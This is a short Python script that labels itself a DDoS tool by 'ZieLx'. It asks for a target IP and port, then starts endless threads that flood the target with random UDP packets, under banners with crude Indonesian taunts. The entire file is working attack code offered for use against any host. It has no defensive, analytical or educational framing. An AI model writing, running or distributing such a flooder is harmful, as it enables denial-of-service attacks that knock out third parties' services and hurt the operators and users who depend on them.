#Author : ZieLx
import random
import socket
import threading
import os,sys
import time

os.system("clear")
time.sleep(2)
print('''\033[1;31;40m


  ________ _____ _    __  __
 |__  /_ _| ____| |   \ \/ /
   / / | ||  _| | |    \  / 
  / /_ | || |___| |___ /  \ 
 /____|___|_____|_____/_/\_\''')
print("\033[94m")
print("••••••••••••••••••••••••")
print("DONT ABUSE NGENTOT")
print("DDOS TOOLS BY ZIELX")
print("••••••••••••••••••••••••")
ip = str(input("IP : "))
port = int(input("PORT : "))
choice = str(input("GAS SAYANK? (y/n) : "))
times = int(input("PACKETS : "))
threads = int(input("THREADS : "))

os.system("clear")
def run():
        data = random._urandom(818)
        i = random.choice(("[!]","[%]","[!]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +" !! PACKETS FROM ZIELX !!")
                except:
                        print("[-] !! PACKET FROM ZIELX !!")

def run2():
        data = random._urandom(818)
        i = random.choice(("[!]","[%]","[!]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" !! PACKET FROM ZIELX !!")
                except:
                        s.close()
                        print("[-] !! PACKET FROM ZIELX")

def run3():
        data = random._urandom(818)
        i = random.choice(("[!]","[%]","[!]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" !! PACKET FROM ZIELX !!")
                except:
                        s.close()
                        print("[X] YAHAHHAHA MT YA DECK")

for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
        else:
                th = threading.Thread(target = run3)
                th.start()

